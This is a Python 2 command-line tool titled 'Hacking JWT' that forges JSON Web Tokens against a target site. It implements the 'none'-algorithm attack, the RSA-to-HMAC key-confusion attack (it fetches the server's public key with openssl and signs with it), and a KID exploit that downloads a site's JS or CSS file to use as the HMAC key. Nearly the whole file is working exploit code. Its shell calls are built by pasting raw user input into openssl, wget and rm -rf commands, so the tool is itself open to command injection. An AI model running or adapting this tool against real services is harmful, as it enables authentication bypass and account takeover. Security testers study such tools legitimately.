#!/usr/bin/python
# -*- coding: utf-8 -*-

from __future__ import with_statement
from __future__ import absolute_import

import os
import platform
from sys import exit
from time import sleep
import readline
import hmac
import base64
import hashlib
import requests
from bs4 import BeautifulSoup as bs
from urlparse import urljoin
from io import open
from blessings import Terminal

from pyfiglet import Figlet

red = '\033[91m'
orange = '\33[38;5;208m'
green = '\033[92m'
cyan = '\033[31m'
bold = '\033[1m'
end = '\033[0m'

t = Terminal()


def head():
    os.system('clear')
    print '''{4}
 _   _            _    _                   ___        _______ 
| | | | __ _  ___| | _(_)_ __   __ _      | \ \      / /_   _|
| |_| |/ _` |/ __| |/ / | '_ \ / _` |  _  | |\ \ /\ / /  | |  
|  _  | (_| | (__|   <| | | | | (_| | | |_| | \ V  V /   | |  
|_| |_|\__,_|\___|_|\_\_|_| |_|\__, |  \___/   \_/\_/    |_|  
                               |___/                          

       *****    Hacking JWT   *****
       172.20.20.31
{3}Follow me :{3}
{1}•{3} GitHub : {0}https://github.com/keramatAlijani{3}
{1}•{3} Linkedin: {0}https://www.linkedin.com/in/keramat-alijani-41529b126/{3}
{1}•{3} Email: {0}Keramat.Alijani@aut.ac.ir
'''.format(orange,
            green, bold, end, cyan)


def head2():
    os.system('clear')
    print '''{4}
 _   _            _    _                   ___        _______ 
| | | | __ _  ___| | _(_)_ __   __ _      | \ \      / /_   _|
| |_| |/ _` |/ __| |/ / | '_ \ / _` |  _  | |\ \ /\ / /  | |  
|  _  | (_| | (__|   <| | | | | (_| | | |_| | \ V  V /   | |  
|_| |_|\__,_|\___|_|\_\_|_| |_|\__, |  \___/   \_/\_/    |_|  
                               |___/                          

       *****    Hacking JWT   *****
{3}
'''.format(orange,
            green, bold, end, cyan)


def finish():
    head()
    print '{0}Until next time...{1}'.format(green, end)
    exit(0)


def Checking_None():
    jwt = raw_input('Please Enter Your JWT: ')
    jwt = jwt.split('.')
    header = base64.urlsafe_b64decode(jwt[0] + '==')
    payload = base64.urlsafe_b64decode(jwt[1] + '==')
    print 'Header: ' + header
    print 'Payload: ' + payload

    payload = raw_input('Please Enter New Payload: ')
    if 'RS512' in header:
        header = header.replace('RS512', 'None')
    elif 'RS256' in header:
        header = header.replace('RS256', 'None')
    elif 'HS512' in header:
        header = header.replace('HS512', 'None')
    elif 'HS256' in header:
        header = header.replace('HS256', 'None')

    print 'Header: ' + header
    print 'Payload: ' + payload
    strr = base64.b64encode(header) + '.' + base64.b64encode(payload) \
        + '.'
    strr = strr.replace('=', '')
    print t.green(strr)


def Extract_Public_Key():
    url = raw_input('Please Enter Domain Address(without https ot http): ')
    url = url.replace('https://', '')
    url = url.replace('http://', '')
    url = url.replace('/', '')
    print 'Extracting public key ..'
    os.system('timeout 5 openssl s_client -connect ' + url
              + ':443 | openssl x509 -pubkey -noout > public.pem')
    file = open('public.pem', 'r')
    public = file.read()
    print t.green('Extracting the public key was successfully done.')
    print public


def Checking_RSA_to_HMAC(type):

    if type == 1:
        os.system('rm -rf public.pem')
        os.system('rm -rf cert.pem')
        Extract_Public_Key()
    f = open('public.pem')
    key = f.read()
    jwt = raw_input('Please Enter Your JWT: ')
    jwt = jwt.split('.')
    header = base64.urlsafe_b64decode(jwt[0] + '==')
    payload = base64.urlsafe_b64decode(jwt[1] + '==')
    print 'Header: ' + header
    print 'Payload: ' + payload
    payload = raw_input('Please Enter New Payload: ')
    header = header.replace('RS256', 'HS256')
    print 'Header: ' + header
    print 'Payload: ' + payload
    strr = base64.b64encode(header) + '.' + base64.b64encode(payload)
    strr = strr.replace('=', '')
    sig = base64.urlsafe_b64encode(hmac.new(key, strr,
                                   hashlib.sha256).digest()).decode('UTF-8'
            ).rstrip('=')
    print t.green(strr + '.' + sig)


def Checking_Exploiting_KID():

    url = raw_input('Please Enter URL(with http | https): ')
    session = requests.Session()
    session.headers[u'User-Agent'] = \
        u'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'
    html = session.get(url).content
    soup = bs(html, u'html.parser')
    files = []
    script_files = []

    for script in soup.find_all(u'script'):
        if script.attrs.get(u'src'):

            script_url = urljoin(url, script.attrs.get(u'src'))
            script_files.append(script_url)

    css_files = []

    for css in soup.find_all(u'link'):
        if css.attrs.get(u'href'):

            css_url = urljoin(url, css.attrs.get(u'href'))
            css_files.append(css_url)

    print u'Total script files in the page:', len(script_files)
    print u'Total CSS files in the page:', len(css_files)

    i = 1
    for js_file in script_files:
        print t.green('[' + str(i) + '] ' + js_file)
        i = i + 1
        files.insert(i, str(js_file))

    for css_file in css_files:
        print t.green('[' + str(i) + '] ' + css_file)
        i = i + 1
        files.insert(i, str(css_file))

    fid = \
        raw_input('Which one of these files do you want to set as a  key(1,2,..): '
                  )
    os.system('rm -rf key.txt')
    os.system('wget -O key.txt ' + files[int(fid) - 1])
    file = open('key.txt', 'r')
    key = file.read()

    jwt = raw_input('Please Enter Your JWT: ')
    jwt = jwt.split('.')
    header = base64.urlsafe_b64decode(jwt[0] + '==')
    payload = base64.urlsafe_b64decode(jwt[1] + '==')

    print 'Header: ' + header
    print 'Payload: ' + payload
    header = raw_input('Please Enter New Header(Change KID): ')
    payload = raw_input('Please Enter New Payload: ')
    print 'Header: ' + header
    print 'Payload: ' + payload
    strr = base64.b64encode(header) + '.' + base64.b64encode(payload)
    strr = strr.replace('=', '')
    sig = base64.urlsafe_b64encode(hmac.new(key, strr,
                                   hashlib.sha256).digest()).decode('UTF-8'
            ).rstrip('=')
    print t.green(strr + '.' + sig)


def choosepayload():

    select = \
        raw_input('''{2}Choose a technique for testing:{1}

{0}[{1}1{0}]{1} Testing none technique
{0}[{1}2{0}]{1} Testing HMAC instead of RSA
{0}[{1}3{0}]{1} Testing for Exploiting KID(if, it exists in the token)
{0}[{1}0{0}]{1} Exit

{0}{2}Hacking-JWT:~#{1} '''.format(end,
                  end, end))
    if select == '1':
        head2()
        print t.green('Testing none technique')
        Checking_None()
    elif select == '2':
        head2()
        type = \
            raw_input('''{2}Where is public key:{1}

{0}[{1}1{0}]{1} It is already stored in public.pem
{0}[{1}2{0}]{1} Extract it from the server
{0}[{1}0{0}]{1} Main Menu

{0}{2}Hacking-JWT:~/Testing-HMAC-instead-of-RSA#{1} '''.format(green,
                      end, bold))
        if type == '0':
            choosepayload()
        elif type == '1':
            print t.green('Testing HMAC instead of RSA')
            Checking_RSA_to_HMAC(0)
        elif type == '2':
            print t.green('Testing HMAC instead of RSA')
            Checking_RSA_to_HMAC(1)
    elif select == '3':

        head()
        print t.green('Testing for Exploiting KID')
        Checking_Exploiting_KID()
    elif select == '0':
        finish()
    else:
        head()
        print '{0}Please choose a valid option.{1}'.format(red, end)
        sleep(1)
        choosepayload()


if __name__ == '__main__':
    try:
        head()

        choosepayload()
    except KeyboardInterrupt:
        finish()
